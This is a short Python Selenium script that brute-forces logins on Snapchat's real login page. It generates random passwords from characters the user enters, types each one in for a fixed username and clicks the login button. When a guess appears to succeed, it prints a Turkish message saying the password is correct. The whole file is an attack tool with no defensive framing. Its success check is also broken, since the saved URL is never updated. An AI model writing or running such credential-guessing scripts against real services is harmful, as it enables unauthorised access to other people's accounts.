from selenium import webdriver
from selenium.webdriver.firefox.options import Options
import time
import random
"""
options = Options()
options.page_load_strategy = 'eager'
"""
browser = webdriver.Firefox()
url = "https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome"

browser.get(url)
time.sleep(2)
password = browser.find_element_by_xpath("//*[@id='password']")

letterlist = input("Enter letters and numbers:")
lenght = int(input("lenght of pw:"))
print(letterlist)

psw = ""
checkerurl = browser.current_url

counter = 1
wordlist = set()
while counter <= 100:
        psw = random.choices(letterlist,k=lenght)
        psw1 = "x"
        psw2 = "".join(psw)
        psw = psw1 + psw2
        wordlist.add(psw)
        counter += 1

wlist = []
for word in wordlist:
        wlist.append(word)

wlist = sorted(wlist)
print(wlist)
counter2 = 0



while counter2 < len(wlist):
        time.sleep(2)
        username = browser.find_element_by_xpath("//*[@id='username']")
        password = browser.find_element_by_xpath("//*[@id='password']")
        username.send_keys("x")
        password.send_keys(wlist[counter2])
        time.sleep(2)
        print("************"+wlist[counter2]+"*****************")
        login = browser.find_element_by_xpath("//*[@id='login_form']/div[4]/button")
        login.click()
        time.sleep(5)
        if checkerurl != "https://accounts.snapchat.com/accounts/welcome":
                browser.get(url)
                time.sleep(3)
                counter2 += 1
                
        else:        
                print(wlist[counter2]," doğru şifredir")
                break

time.sleep(3)

